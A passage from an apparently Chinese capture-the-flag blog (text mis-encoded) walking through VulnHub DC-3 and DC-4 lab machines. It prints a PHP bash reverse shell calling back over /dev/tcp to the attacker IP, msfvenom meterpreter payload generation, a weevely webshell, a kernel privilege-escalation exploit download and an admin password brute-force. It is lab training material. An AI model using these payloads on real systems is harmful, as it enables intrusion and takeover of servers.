<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903142440563.png" alt="image-20220903142440563"></p>
<p>å‘ç°æœ‰ä¸ª<code>new file</code>ï¼Œå¯ä»¥æ–°å»ºæ–‡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå¯ä»¥æ–°å»ºä¸€ä¸ªæˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶ï¼Œæ‹¿å–é¶æœºçš„<code>shell</code></p>
<h2><span id="åé—¨ç”Ÿæˆè¿›å…¥shell">åé—¨ç”Ÿæˆï¼Œè¿›å…¥shell</span></h2><h3><span id="æ³•1">æ³•1</span></h3><p><strong>msfvenom</strong></p>
<h4><span id="msfç”Ÿæˆæœ¨é©¬">msfç”Ÿæˆæœ¨é©¬</span></h4><blockquote>
<p>è¾“å…¥<code>msfvenom -p php/meterpreter/reverse_tcp LHOST=kaliçš„ip LPORT=4444 -f raw &gt; shell.php</code><br>&#x2F;&#x2F;æ³¨æ„ï¼ŒLHOSTæ˜¯kaliçš„ip</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903222910397.png" alt="image-20220903222910397"></p>
<blockquote>
<p>è¾“å…¥<code>ls</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903144052531.png" alt="image-20220903144052531"></p>
<p>å‘ç°ç›®å½•ä¸‹ç”Ÿæˆäº† <code>shell.php</code></p>
<blockquote>
<p>è¾“å…¥<code>cat shell.php</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903223007361.png" alt="image-20220903223007361"></p>
<p>å¾—åˆ°é¶æœºå¯¹åº”çš„æœ¨é©¬</p>
<p>ç„¶ååœ¨ç½‘ç«™æ–°å»ºä¸€ä¸ª<code>php</code>æ–‡ä»¶</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903221145987.png" alt="image-20220903221145987"></p>
<p>ç„¶åæŠŠæœ¨é©¬å†…å®¹å¯¼å…¥è¿›å»</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903223039265.png" alt="image-20220903223039265"></p>
<p> ç„¶åä¿å­˜ä¸€ä¸‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903221243628.png" alt="image-20220903221243628"></p>
<p>ç„¶åæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°æœ¨é©¬æ–‡ä»¶è·¯å¾„ï¼Œè¿›è¡Œè®¿é—®çœ‹çœ‹ï¼Œèƒ½ä¸èƒ½è®¿é—®æˆåŠŸ</p>
<p>å› ä¸ºæˆ‘ä»¬æ–‡ä»¶æ˜¯åœ¨<code>/templates/protostar/</code>ä¸‹ä¸Šä¼ çš„ï¼Œæ‰€ä»¥è®¿é—®</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903221340927.png" alt="image-20220903221340927"></p>
<p>çœ‹åˆ°<code>/*</code>ï¼Œçœ‹æ¥æ˜¯å¯ä»¥æˆåŠŸè®¿é—®</p>
<h5><span id="msfåˆ©ç”¨æœ¨é©¬">msfåˆ©ç”¨æœ¨é©¬</span></h5><p>ç„¶åç”¨<code>msf</code>è¿›è¡Œåˆ©ç”¨</p>
<blockquote>
<p>å…ˆè¾“å…¥<code>msfconsole</code>ï¼Œè¿›å…¥msf</p>
</blockquote>
<blockquote>
<p>ç„¶åè¾“å…¥<br><code>use exploit/multi/handler</code></p>
<p><code>set payload php/meterpreter/reverse_tcp</code><br>è¿›å…¥æˆ‘ä»¬åˆ©ç”¨msfåˆ¶ä½œçš„æœ¨é©¬åˆ©ç”¨ç¯å¢ƒ</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903220102252.png" alt="image-20220903220102252"></p>
<blockquote>
<p>è¾“å…¥<code>show options</code><br>çœ‹çœ‹éœ€è¦å¡«å†™ä»€ä¹ˆ</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903220250819.png" alt="image-20220903220250819"></p>
<p>çœ‹åˆ°LHOSTç›‘å¬çš„ipæ²¡æœ‰å¡«å†™</p>
<blockquote>
<p>è¾“å…¥<code>set LHOST 192.168.133.140</code>  &#x2F;&#x2F;kaliçš„ip</p>
</blockquote>
<blockquote>
<p>è¾“å…¥<code>run</code>ï¼Œè¿è¡Œ</p>
</blockquote>
<p>è¿™é‡Œå°±æ˜¯åœ¨ç­‰å¾…æˆ‘ä»¬çš„æœ¨é©¬è¿è¡Œï¼Œæˆ‘ä»¬åªéœ€è¦åˆ·æ–°ä¸€ä¸‹æˆ‘ä»¬ä¹‹å‰è®¿é—®æœ¨é©¬çš„ç½‘é¡µ</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903223440029.png" alt="image-20220903223440029"></p>
<p>ç„¶åè¾“å…¥</p>
<blockquote>
<p>è¾“å…¥<code>shell</code></p>
<p>ç„¶åè¾“å…¥<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>&#x2F;&#x2F;è¿›å…¥äº¤äº’å¼shellï¼Œå½“ç„¶ä¸å«Œçœ‹ç€éº»çƒ¦ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ‰§è¡Œåé¢å‘½ä»¤</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903223812256.png" alt="image-20220903223812256"></p>
<h5><span id="ææƒ">ææƒ</span></h5><blockquote>
<p>è¾“å…¥<code>ls</code>,ç®€å•çœ‹çœ‹æ–‡ä»¶</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220903224116654.png" alt="image-20220903224116654"></p>
<blockquote>
<p>è¾“å…¥<code>uname -a</code><br>æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904082811177.png" alt="image-20220904082811177"></p>
<p>çœ‹åˆ°<code>unbuntu</code>æ˜¯<code>2016</code>å¹´<code>4</code>æœˆå‘å¸ƒçš„ï¼Œæ‰€ä»¥æ˜¯<code>unbuntu16.04</code></p>
<p><code>linux</code>ç‰ˆæœ¬æ˜¯<code>4.4.0-21</code>ç‰ˆ</p>
<p>æ‰€ä»¥æ ¹æ®è¿™ä¸ªç‰ˆæœ¬çœ‹çœ‹æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„æ¼æ´ï¼Œæ¥æ–¹ä¾¿æˆ‘ä»¬ææƒ</p>
<blockquote>
<p>è¿˜æ˜¯åˆ©ç”¨ä¹‹å‰ç”¨è¿‡çš„<br><code>searchsploit unbuntu 16.04</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904093243588.png" alt="image-20220904093243588"></p>
<p><strong>double-fdput()</strong> ,è¿™æ˜¯è¿è¡Œå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå³å¯è·å–<code>root</code>æƒé™</p>
<p>æˆ‘ä»¬æŠŠå®ƒå†…å®¹æ˜¾ç¤ºå‡ºæ¥</p>
<blockquote>
<p>è¾“å…¥<code>searchsploit -p 39772</code>æ˜¾ç¤ºæ–‡æœ¬è·¯å¾„<br>   <code>cat /usr/share/exploitdb/exploits/linux/local/39772.txt</code> æ˜¾ç¤ºå†…å®¹</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904093849189.png" alt="image-20220904093849189"></p>
<p>åœ¨æœ€åçœ‹åˆ°è¯¥æ¼æ´åˆ©ç”¨çš„<code>exp</code>ä¸‹è½½é“¾æ¥</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904095521748.png" alt="image-20220904095521748"></p>
<p>ä¸‹è½½æœ€åä¸€ä¸ªé“¾æ¥çš„å‹ç¼©åŒ…</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/offensive-security/</span>exploitdb-bin-sploits<span class="regexp">/raw/m</span>aster<span class="regexp">/bin-sploits/</span><span class="number">39772</span>.zip</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨æˆ‘ä»¬çš„ç½‘ç«™åå°ä¸Šä¼ ä¸Šå»ï¼Œå’Œåˆ›å»ºæœ¨é©¬æ–‡ä»¶æ—¶å€™ä¸€æ ·</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904101055473.png" alt="image-20220904101055473"></p>
<p>ç»“æœæŠ¥é”™äº†</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904101159692.png" alt="image-20220904101159692"></p>
<p>çœ‹æ¥è¿™ä¸ªç½‘ç«™ä¸Šä¼ å¤„æ˜¯ä¸èƒ½ä¸Šä¼ å‹ç¼©åŒ…æ–‡ä»¶çš„</p>
<p>æ‰€ä»¥æˆ‘ä»¬åªèƒ½ç”¨å·¥å…·è¿›è¡Œç›´æ¥ä¸Šä¼ äº†ï¼Œæ¯”å¦‚èšå‰‘æˆ–è€…èœåˆ€ç­‰å·¥å…·</p>
<p>æˆ‘ä»¬å’Œä¹‹å‰ä¸€æ ·æ–°å»ºä¸€ä¸ª<code>php</code>æ–‡ä»¶å†™ä¸Šæˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904101711601.png" alt="image-20220904101711601"></p>
<p>ç”¨èšå‰‘è¿æ¥</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">123</span>.php</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904101700569.png" alt="image-20220904101700569"></p>
<p>ç„¶åæŠŠæˆ‘ä»¬çš„å‹ç¼©åŒ…æ”¾åœ¨ç›®å½•ä¸‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904112832628.png" alt="image-20220904112832628"></p>
<p>ç„¶åè¿”å›<code>msf</code></p>
<blockquote>
<p>è¾“å…¥<code>ls</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904112929091.png" alt="image-20220904112929091"></p>
<p>å‘ç°å‹ç¼©åŒ…å·²ç»åœ¨é‡Œé¢äº†</p>
<p>ç„¶åè§£å‹ç¼©</p>
<blockquote>
<p>è¾“å…¥<code>unzip 39772.zip</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904113114803.png" alt="image-20220904113114803"></p>
<p>å‘ç°ç›®å½•ä¸‹å¤šäº†ä¸ª<code>39772</code>çš„ç›®å½•</p>
<blockquote>
<p>è¾“å…¥<code>cd 39772</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904113213562.png" alt="image-20220904113213562"></p>
<p>å‘ç°æœ‰ä¸¤ä¸ªå‹ç¼©åŒ…ï¼Œæˆ‘ä»¬åˆ©ç”¨<code>exploit.tar</code></p>
<blockquote>
<p>è¾“å…¥<code>tar -xvf exploit.tar</code> &#x2F;&#x2F;è§£å‹ç¼©</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904113439714.png" alt="image-20220904113439714"></p>
<p>å‘ç°å¤šäº†ä¸ª<code>ebpf_mapfd_doubleput_exploit</code>ç›®å½•</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904113541560.png" alt="image-20220904113541560"></p>
<p>å‘ç°æœ‰ä¸ª<code>compile.sh</code></p>
<p>è¿è¡Œ</p>
<blockquote>
<p>è¾“å…¥<code>./compile.sh</code></p>
</blockquote>
<p>å‘ç°ç›®å½•ä¸‹æœ‰å¤šäº†ä¸€ä¸ª<code>doubleput</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904113730537.png" alt="image-20220904113730537"></p>
<p>è¿™å°±æ˜¯ææƒæ–‡ä»¶ï¼Œè¿è¡Œä¸€ä¸‹</p>
<blockquote>
<p>è¾“å…¥<code>./doupleput</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904114028987.png" alt="image-20220904114028987"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥<span class="built_in">whoami</span>ï¼Œçœ‹çœ‹ææƒæˆåŠŸæ²¡</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904114119370.png" alt="image-20220904114119370"></p>
<p>ææƒæˆåŠŸ</p>
<p>ç„¶åæˆ‘ä»¬åˆ°<code>/root</code>ç›®å½•ä¸‹æŸ¥çœ‹ <code>flag</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904114212223.png" alt="image-20220904114212223"></p>
<hr>
<blockquote>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\ \      / /__|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  _ \  ___  _ __   ___</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line"> \ \ /\ / / _ \ |<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">/ _ \</span>|<span class="string"> &#x27;_ \ / _ \ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line">  \ V  V /  __/ |<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  __/_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_</span>|</span><br><span class="line">   \_/\_/ \___|<span class="string">_</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">____/ \___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string">\___(_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_)</span></span><br></pre></td></tr></table></figure>

<p><code>Congratulations are in order.  :-)</code></p>
<p><code>I hope you&#39;ve enjoyed this challenge as I enjoyed making it.</code></p>
<p><code>If there are any ways that I can improve these little challenges,</code><br><code>please let me know.</code></p>
<p><code>As per usual, comments and complaints can be sent via Twitter to @DCAU7</code></p>
<p><code>Have a great day!!!!</code></p>
<p>æ„æ€æ˜¯ï¼š</p>
<p>æ­å–œä½ ï¼Œä¸€åˆ‡æ­£å¸¸ã€‚ï¼š-ï¼‰</p>
<p>æˆ‘å¸Œæœ›ä½ å’Œæˆ‘ä¸€æ ·å–œæ¬¢è¿™ä¸ªæŒ‘æˆ˜ã€‚</p>
<p>å¦‚æœæœ‰ä»»ä½•æ–¹æ³•å¯ä»¥æ”¹å–„è¿™äº›å°æŒ‘æˆ˜ï¼Œ</p>
<p>è¯·è®©æˆ‘çŸ¥é“ã€‚</p>
<p>å¦‚å¾€å¸¸ä¸€æ ·ï¼Œè¯„è®ºå’ŒæŠ•è¯‰å¯ä»¥é€šè¿‡Twitterå‘é€åˆ°@DCAU7</p>
<p>ç¥ä½ æœ‰ç¾å¥½çš„ä¸€å¤©ï¼ï¼ï¼ï¼</p>
</blockquote>
<p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p>
<h3><span id="æ³•2">æ³•2</span></h3><h4><span id="åå¼¹shell"><strong>åå¼¹shell</strong></span></h4><blockquote>
<p>åå¼¹shellï¼Œå°±æ˜¯æ§åˆ¶ç«¯ç›‘å¬åœ¨æŸTCP&#x2F;UDPç«¯å£ï¼Œè¢«æ§ç«¯å‘èµ·è¯·æ±‚åˆ°è¯¥ç«¯å£ï¼Œå¹¶å°†å…¶å‘½ä»¤è¡Œçš„è¾“å…¥è¾“å‡ºè½¬åˆ°æ§åˆ¶ç«¯ã€‚</p>
<p>é€šä¿—ç‚¹è¯´ï¼Œåå¼¹shellå°±æ˜¯ä¸€ç§åå‘é“¾æ¥ï¼Œä¸æ­£å‘çš„sshç­‰ä¸åŒï¼Œå®ƒæ˜¯åœ¨å¯¹æ–¹ç”µè„‘æ‰§è¡Œå‘½ä»¤è¿æ¥åˆ°æˆ‘æ–¹çš„æ”»å‡»æ¨¡å¼ï¼Œå¹¶ä¸”è¿™ç§æ”»å‡»æ¨¡å¼å¿…é¡»æ­é…è¿œç¨‹æ‰§è¡Œå‘½ä»¤æ¼æ´æ¥ä½¿ç”¨ã€‚</p>
<p>ç”±äºé˜²ç«å¢™ç­‰é™åˆ¶ï¼Œå¯¹æ–¹æœºå™¨åªèƒ½å‘é€è¯·æ±‚ï¼Œä¸èƒ½æ¥æ”¶è¯·æ±‚</p>
<p>å¯¹äºç—…æ¯’ï¼Œæœ¨é©¬ï¼Œå—å®³è€…ä»€ä¹ˆæ—¶å€™èƒ½ä¸­æ‹›ï¼Œå¯¹æ–¹çš„ç½‘ç»œç¯å¢ƒæ˜¯ä»€ä¹ˆæ ·çš„ï¼Œä»€ä¹ˆæ—¶å€™å¼€å…³æœºï¼Œéƒ½æ˜¯æœªçŸ¥ï¼Œå»ºç«‹ä¸€ä¸ªæœåŠ¡ç«¯ï¼Œè®©æ¶æ„ç¨‹åºä¸»åŠ¨è¿æ¥ï¼Œæ‰æ˜¯ä¸Šç­–ã€‚</p>
</blockquote>
<p>å’Œæ³•ä¸€ä¸€æ ·ï¼Œæˆ‘ä»¬éœ€è¦å†™ä¸€ä¸ªåå¼¹<code>shell</code>çš„<code>php</code>æ–‡ä»¶</p>
<blockquote>
<p><code>&lt;?php system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.133.140/8888 0&gt;&amp;1&#39;&quot;);?&gt;</code></p>
<p>&#x2F;&#x2F;æ³¨æ„è¿™é‡Œçš„ipä¸ºkaliçš„ipï¼Œ8888ä¸ºç›‘å¬çš„ç«¯å£</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904115013063.png" alt="image-20220904115013063"></p>
<blockquote>
<p>è¾“å…¥<code>nc -lnvp 8888</code>å¼€å§‹ç›‘å¬<br>ç„¶åè®¿é—®<code>456.php</code><br><code>http://192.168.133.139/templates/protostar/456.php</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904130847588.png" alt="image-20220904130847588"></p>
<p>æ‹¿åˆ°<code>shell</code>ï¼Œåé¢ææƒå’Œæ³•ä¸€</p>
<p>ä¸€æ ·</p>
<h3><span id="æ³•3">æ³•3</span></h3><h4><span id="weevelyææƒæ²¡å›æ˜¾"><strong>weevely</strong>ã€ææƒæ²¡å›æ˜¾ã€‘</span></h4><blockquote>
<p><code>Weevely</code>æ˜¯ä¸€æ¬¾ä½¿ç”¨pythonç¼–å†™çš„webshellå·¥å…·,é›†webshellç”Ÿæˆå’Œè¿æ¥äºä¸€èº«,é‡‡ç”¨c&#x2F;sæ¨¡å¼ æ„å»º,å¯ä»¥ç®—ä½œæ˜¯linuxä¸‹çš„ä¸€æ¬¾phpèœåˆ€æ›¿ä»£å·¥å…·</p>
</blockquote>
<p>ç”Ÿæˆ<code>Shell</code></p>
<blockquote>
<p><code>weevely generate  &lt;æ–‡ä»¶å&gt;</code></p>
<p><code>weevely generate 123456 shell.php</code></p>
</blockquote>
<p>æŠŠç”Ÿæˆçš„å†…å®¹ï¼Œå¤åˆ¶åˆ°æˆ‘ä»¬åˆ›å»ºçš„<code>789.php</code>æ–‡ä»¶é‡Œï¼Œå’Œå‰é¢ä¸¤ä¸ªæ–¹æ³•æ­¥éª¤ä¸€æ ·</p>
<p>åˆ©ç”¨è§¦å‘<code>shell</code></p>
<blockquote>
<p><code>weevely http://192.168.133.139/templates/protostar/789.php 123456</code></p>
<p><code>python -m http.server 9999</code>   </p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904133118746.png" alt="image-20220904133118746"></p>
<p>æˆåŠŸè¿›å…¥<code>shell</code></p>
<p>ä½†æ˜¯å½“æ‰§è¡Œææƒæ—¶</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220904135935922.png" alt="image-20220904135935922"></p>
<p>æŠ¥é”™æ— æ³•ææƒï¼Œçœ‹æ¥æ˜¯è¢«è¿‡æ»¤å•¥çš„</p>
<hr>
<h1><span id="å››-dc-4åˆçº§">å››ã€DC-4[åˆçº§]</span></h1><p><strong>only one flag</strong></p>
<h2><span id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</span></h2><p>å…ˆçœ‹çœ‹é¶æœºç«¯å£è¿è¡Œçš„æœåŠ¡</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918190610478.png" alt="image-20220918190610478"></p>
<p>å‘ç°æœ‰<code>22</code>å’Œ<code>80</code>ç«¯å£ï¼Œåˆ†åˆ«è¿è¡Œ<code>ssh</code>å’Œ<code>http</code></p>
<p>æˆ‘ä»¬å…ˆè®¿é—®<code>80</code>ç«¯å£</p>
<blockquote>
<p>è®¿é—®ipï¼š<code>192.168.133.141</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918190945726.png" alt="image-20220918190945726"></p>
<p>æ˜¯ä¸€ä¸ªåŸºæœ¬çš„ç™»å½•çª—å£ï¼Œæœ‰æç¤ºæ˜¯<code>admin</code>ç”¨æˆ·ç™»å½•ç•Œé¢ï¼Œæ‰€ä»¥<strong>å¯èƒ½éœ€è¦å¯†ç çˆ†ç ´ç™»å½•</strong></p>
<p>æˆ‘ä»¬å†åˆ©ç”¨<code>wappalyzer</code>çœ‹ä¸€ä¸‹ç½‘ç«™ä¸€äº›åŸºæœ¬ä¿¡æ¯</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918194402321.png" alt="image-20220918194402321"></p>
<p>æ²¡æœ‰å•¥æœ‰ç”¨çš„ä¿¡æ¯</p>
<h2><span id="å¯†ç çˆ†ç ´">å¯†ç çˆ†ç ´</span></h2><p>ç„¶åæˆ‘ä»¬å°±å¼€å§‹è¿›è¡Œå¯†ç çˆ†ç ´</p>
<p>å·²çŸ¥ç”¨æˆ·åä¸º<code>admin</code>ï¼Œåªç”¨å¯¹å¯†ç çˆ†ç ´</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918202233098.png" alt="image-20220918202233098"></p>
<p>ã€å­—å…¸å¯ä»¥è‡ªå·±æ‰¾ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥çœ‹æˆ‘å­¦ä¹ ç¬”è®°å†™çš„ç½‘ç«™ä¸‹è½½ã€‘</p>
<p>è¿™é‡Œæˆ‘ç”¨çš„<code>top2000.txt</code></p>
<p>æœ€åçˆ†ç ´å‡ºå¯†ç ä¸º<code>happy</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918203225520.png" alt="image-20220918203225520"></p>
<p>ç™»å½•è¯•è¯•</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918204147349.png" alt="image-20220918204147349"></p>
<p>ç™»å½•æˆåŠŸï¼Œè¿›å…¥<code>Command</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20220918204230810.png" alt="image-20220918204230810"></p>
